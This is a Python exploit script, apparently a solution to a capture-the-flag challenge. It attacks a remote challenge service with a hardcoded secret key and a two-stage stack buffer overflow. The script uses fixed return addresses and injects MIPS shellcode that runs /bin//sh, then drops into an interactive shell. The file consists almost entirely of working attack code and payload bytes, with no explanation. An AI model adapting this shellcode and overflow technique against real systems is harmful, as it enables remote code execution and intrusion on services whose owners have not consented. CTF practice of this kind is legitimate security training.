#!/usr/bin/env python
from sc_pwn import *

target  = {'host':'9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site','port':35000}
key = 'EKO{LaBigBef0rd}'

pack_32b        = lambda x : pack('>I', x)
addr_buf        = 0x00411800

#==========
def attack(cmn):
    cmn.read_until('secret key: ')
    cmn.send(key)

    shellcode  = '\x28\x06\xff\xff'     # slti    a2,zero,-1
    shellcode += '\x3c\x0f\x2f\x2f'     # lui     t7,0x2f2f
    shellcode += '\x35\xef\x62\x69'     # ori     t7,t7,0x6269
    shellcode += '\xaf\xaf\xff\xf4'     # sw      t7,-12(sp)
    shellcode += '\x3c\x0e\x6e\x2f'     # lui     t6,0x6e2f
    shellcode += '\x35\xce\x73\x68'     # ori     t6,t6,0x7368
    shellcode += '\xaf\xae\xff\xf8'     # sw      t6,-8(sp)
    shellcode += '\xaf\xa0\xff\xfc'     # sw      zero,-4(sp)
    shellcode += '\x27\xa4\xff\xf4'     # addiu   a0,sp,-12
    shellcode += '\x28\x05\xff\xff'     # slti    a1,zero,-1
    shellcode += '\x24\x02\x0f\xab'     # li      v0,4011
    shellcode += '\x01\x01\x01\x0c'     # syscall 0x40404
    """
    shellcode  = "\x28\x04\xff\xff"     # slti    a0,zero,-1
    shellcode += "\x24\x02\x0f\xa1"     # li      v0,4001
    shellcode += "\x01\x01\x01\x0c"     # syscall 0x40404
    """

    exploit_st1  = '\x00'*0x114
    exploit_st1 += pack_32b(addr_buf)
    exploit_st1 += pack_32b(0x400be0)

    sleep(1)
    cmn.read_until('command> ')
    cmn.sendln(exploit_st1)

    exploit_st2  = shellcode
    exploit_st2 += '\x00'*(0x118-len(exploit_st2))
    exploit_st2 += pack_32b(0x400930)

    cmn.read_until('command> ')
    cmn.sendln(exploit_st2)

#==========

if __name__=='__main__':
    cmn = Communicate(target, mode='SOCKET')
    attack(cmn)

    cmn.set_show()
    Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
